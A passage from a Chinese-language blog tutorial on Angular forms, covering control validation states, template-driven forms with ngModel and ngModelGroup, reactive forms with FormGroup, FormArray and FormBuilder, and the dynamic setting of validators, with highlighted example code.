    &lt;hr&gt;
    &lt;p&gt;Name控件的valid状态：{{userName.valid}} - 表示控件有效&lt;/p&gt;
    &lt;p&gt;Name控件的invalid状态：{{userName.invalid}} - 表示控件无效&lt;/p&gt;
    &lt;p&gt;Name控件的pristine状态：{{userName.pristine}} - 表示控件值未改变&lt;/p&gt;
    &lt;p&gt;Name控件的dirty状态：{{userName.dirty}} - 表示控件值已改变&lt;/p&gt;
    &lt;p&gt;Name控件的touched状态：{{userName.touched}} - 表示控件已被访问过&lt;/p&gt;
    &lt;p&gt;Name控件的untouched状态：{{userName.untouched}} - 表示控件未被访问过&lt;/p&gt;
    &lt;div *ngIf=&quot;userName.errors?.required&quot;&gt;请您输入用户名&lt;/div&gt;
    &lt;div *ngIf=&quot;userName.errors?.minlength&quot;&gt;
      用户名的长度必须大于 {{userName.errors?.minlength.requiredLength}}，当前的长度为
    	{{userName.errors?.minlength.actualLength}}
    &lt;/div&gt;
    &lt;input type=&quot;password&quot; required ngModel name=&quot;password&quot;&gt;
   &lt;/fieldset&gt;
    &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;
  &lt;/form&gt; // 当用户更改数据后，为了让form组件保持为pristine，用户应该在点击按钮后，调用(#myForm=&quot;ngForm&quot;)myForm.reset().
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  username <span class="token operator">=</span> <span class="token string">'semlinker'</span><span class="token punctuation">;</span>
  <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><h3 id="模板式表单"><a href="#模板式表单" class="header-anchor">#</a> 模板式表单</h3> <p>在 Angular 中，我们可以通过 #userName=&quot;ngModel&quot; 方式获取 ngModel 对象，然后通过 userName.valid 判断表单控件是否通过验证。 通过 userName.errors 属性，来获取对应验证规则 (如 required, minlength 等) 的验证状态。</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;input 
     type=&quot;text&quot; 
     required
     minlength=&quot;3&quot;
     [(ngModel)]=&quot;username&quot;
     #userName=&quot;ngModel&quot;&gt;
	&lt;hr&gt;
    &lt;div *ngIf=&quot;userName.errors?.required&quot;&gt;请您输入用户名&lt;/div&gt;
    &lt;div *ngIf=&quot;userName.errors?.minlength&quot;&gt;
      用户名的长度必须大于 {{userName.errors?.minlength.requiredLength}}，当前的长度为
    	{{userName.errors?.minlength.actualLength}}
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  username <span class="token operator">=</span> <span class="token string">'semlinker'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>在使用 <code>&lt;form&gt;</code> 标签后，我们的 username 输入框，必须添加 name 属性，通过 #loginForm=&quot;ngForm&quot; 方式获取 ngForm 对象，然后通过 loginForm.value 来获取表单的值。</p> <p>表单验证通过则会在表单控件上添加 ng-valid 类，若验证失败则会在表单控件上添加 ng-invalid 类。</p> <p>Angular 表单中提供了 ngSubmit 输出属性，用于监听表单的提交事件。</p> <p>表单控件上 #userName 和 #userName=&quot;ngModel&quot; 的区别</p> <ul><li>#userName - 指向 input 表单控件</li> <li>#userName=&quot;ngModel&quot; - 指向 NgModel 实例</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
 styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   input.ng-invalid {
       border: 3px solid red;
    }
   input.ng-valid {
       border: 3px solid green;
    }
  </span><span class="token template-punctuation string">`</span></span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;form #loginForm=&quot;ngForm&quot; (ngSubmit)=&quot;onSubmit(loginForm.value)&quot; novalidate &gt;
    &lt;input 
     type=&quot;text&quot; 
     required
     minlength=&quot;3&quot;
     name=&quot;username&quot;
     [(ngModel)]=&quot;username&quot;
     #userName=&quot;ngModel&quot;&gt;
    &lt;hr&gt;
    &lt;div *ngIf=&quot;userName.errors?.required&quot;&gt;请您输入用户名&lt;/div&gt;
    &lt;div *ngIf=&quot;userName.errors?.minlength&quot;&gt;
      用户名的长度必须大于 {{userName.errors?.minlength.requiredLength}}，当前的长度为
    	{{userName.errors?.minlength.actualLength}}
    &lt;/div&gt;
    &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;
  &lt;/form&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  username <span class="token operator">=</span> <span class="token string">'semlinker'</span><span class="token punctuation">;</span>
  <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><h3 id="ngmodelgroup"><a href="#ngmodelgroup" class="header-anchor">#</a> ngModelGroup</h3> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;form #loginForm=&quot;ngForm&quot; (ngSubmit)=&quot;onSubmit(loginForm.value)&quot;&gt;
   &lt;fieldset ngModelGroup=&quot;user&quot;&gt;
    &lt;input 
     type=&quot;text&quot; 
     required
     minlength=&quot;3&quot;
     name=&quot;username&quot;
     [(ngModel)]=&quot;username&quot;
     #userName=&quot;ngModel&quot;&gt;
    &lt;hr&gt;
    &lt;div *ngIf=&quot;userName.errors?.required&quot;&gt;请您输入用户名&lt;/div&gt;
    &lt;div *ngIf=&quot;userName.errors?.minlength&quot;&gt;
      用户名的长度必须大于 {{userName.errors?.minlength.requiredLength}}，当前的长度为
    	{{userName.errors?.minlength.actualLength}}
    &lt;/div&gt;
    &lt;input type=&quot;password&quot; ngModel name=&quot;password&quot;&gt;
   &lt;/fieldset&gt;
    &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;
    &lt;hr&gt;
  &lt;/form&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  username <span class="token operator">=</span> <span class="token string">'semlinker'</span><span class="token punctuation">;</span>
  <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p>运行以上代码，点击提交按钮后的输出结果：<code>{ &quot;user&quot;: { &quot;username&quot;: &quot;semlinker&quot;, &quot;password&quot;: &quot;123&quot; } }</code></p> <h3 id="模板式指令"><a href="#模板式指令" class="header-anchor">#</a> 模板式指令</h3> <p>模板式表单在html模板上控制</p> <img src="/vuebloger/img/post/Snipaste_2021-04-05_15-20-42.png"> <p>1.ngForm指令：标记表单，会隐式创建FormGroup类的实例，这个类代表表单数据模型，并存储表单数据；</p> <p>2.ngModel指令：标记单个字段，ngFrom指令会发现含有ngModel指令的标签，并添加到表单数据模型中，使用该指令必须跟随name属性；</p> <p>3.ngModelGroup指令：标记多个字段组合，表现形式是一个对象，如{name:&quot;张三&quot;,pass:&quot;123&quot;}；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>模板变量myForm指向ngForm对象<span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form #myForm <span class="token operator">=</span> <span class="token string">&quot;ngForm&quot;</span> <span class="token punctuation">(</span>ngSubmit<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&quot;onSubmit(myForm.value)&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>用户名<span class="token operator">:</span><span class="token operator">&lt;</span>input ngModel type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;username&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>ngModelGroup将字段嵌套成一个组<span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div ngModelGroup<span class="token operator">=</span><span class="token string">&quot;passwordGroup&quot;</span><span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>密码：<span class="token operator">&lt;</span>input ngModel type<span class="token operator">=</span><span class="token string">&quot;password&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;password&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>确认密码<span class="token operator">:</span><span class="token operator">&lt;</span>input ngModel type<span class="token operator">=</span><span class="token string">&quot;password&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;confirmPass&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>电话：<span class="token operator">&lt;</span>input ngModel type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string">&quot;mobile&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;submit&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;提交&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="响应式表单"><a href="#响应式表单" class="header-anchor">#</a> 响应式表单</h3> <p>在ts上控制表单数据，可用于动态生成表单</p> <p><img src="/vuebloger/img/post/1231653-20180327234129110-134097655.png" alt=""></p> <ul><li>formGroup：标记组，表单也属于组，属于属性指令，需要加 [ ]</li> <li>formGroupName：标记组，用于formGroup指令范围内部。</li> <li>formControl：标记字段，属于属性指令，需要加 [ ]，用于在formGroup指令范围外部。</li> <li>formControlName：标记字段，用于formGroup指令范围内部。</li> <li>formArrayName：标记数组，用于formGroup指令范围内部。</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// reactiveForm.html</span>
<span class="token operator">&lt;</span>form <span class="token punctuation">[</span>formGroup<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;formModel&quot;</span> <span class="token punctuation">(</span>submit<span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> novalidate<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div formGroupName<span class="token operator">=</span><span class="token string">&quot;dateRange&quot;</span><span class="token operator">&gt;</span>
    起始日期<span class="token operator">:</span><span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;date&quot;</span> formControlName<span class="token operator">=</span><span class="token string">&quot;from&quot;</span><span class="token operator">&gt;</span>
    截止日期<span class="token operator">:</span><span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;date&quot;</span> formControlName<span class="token operator">=</span><span class="token string">&quot;to&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ul formArrayName<span class="token operator">=</span><span class="token string">&quot;emails&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 循环formArray数组，和下标 <span class="token operator">--</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>li <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let e of this.formModel.get('emails').controls; let i=index;&quot;</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> formArray没有key，所有使用属性绑定<span class="token punctuation">[</span><span class="token punctuation">]</span>，值为数组的下标 <span class="token operator">--</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;text&quot;</span> <span class="token punctuation">[</span>formControlName<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;i&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>button <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;button&quot;</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;addEmail()&quot;</span><span class="token operator">&gt;</span>增加Email<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>button <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;submit&quot;</span><span class="token operator">&gt;</span>保存<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;text&quot;</span> <span class="token punctuation">[</span>formControl<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;username&quot;</span><span class="token operator">&gt;</span>
<span class="token comment">// reactiveForm.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> FormControl<span class="token punctuation">,</span> FormGroup<span class="token punctuation">,</span> FormArray <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms/src/model'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-reactive-form'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'./reactive-form.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./reactive-form.component.css'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ReactiveFormComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token comment">//定义数据模型</span>
  formModel <span class="token operator">:</span> FormGroup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    dateRange <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormGroup</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token keyword">from</span><span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      to<span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    emails <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FormArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
      <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">&quot;a@aa.com&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">&quot;b@bb.com&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　username<span class="token operator">:</span>FormControl<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token string">&quot;张三&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　
  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>formModel<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">addEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> emails<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>formModel<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">&quot;emails&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> FormArray<span class="token punctuation">;</span>
    emails<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br></div></div><p>也可以使用FormBuilder类来创建数据模型：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>formModel <span class="token operator">:</span> FormGroup<span class="token punctuation">;</span>
<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">fb<span class="token operator">:</span>FormBuilder</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
<span class="token comment">//定义数据模型</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>formModel  <span class="token operator">=</span> fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  dateRange <span class="token operator">:</span> fb<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token keyword">from</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    to<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  emails <span class="token operator">:</span> fb<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token string">&quot;a@aa.com&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token string">&quot;b@bb.com&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="动态调整验证规则"><a href="#动态调整验证规则" class="header-anchor">#</a> 动态调整验证规则</h3> <p>angular不仅支持动态添加from控件（你可以使用单表单做到多表单的所有功能并自动化验证合法性），而且支持动态添加，移除验证限制：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>myControl<span class="token punctuation">.</span><span class="token function">setValidators</span><span class="token punctuation">(</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">)</span><span class="token punctuation">;</span>
myControl<span class="token punctuation">.</span><span class="token function">setValidators</span><span class="token punctuation">(</span><span class="token punctuation">[</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">,</span> Validators<span class="token punctuation">.</span><span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myControl<span class="token punctuation">.</span><span class="token function">clearValidators</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myControl<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>例如：当用户开启手机登录功能，手机号码对应控件的验证规则，必须是必填且格式为合法的手机号码。当用户不开启手机登录功能时，手机号码对应控件将不是必填的。</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// radio 控件</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-group&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;col-md-offset-1 col-md-8 checkbox&quot;</span><span class="token operator">&gt;</span>
         开启手机登录
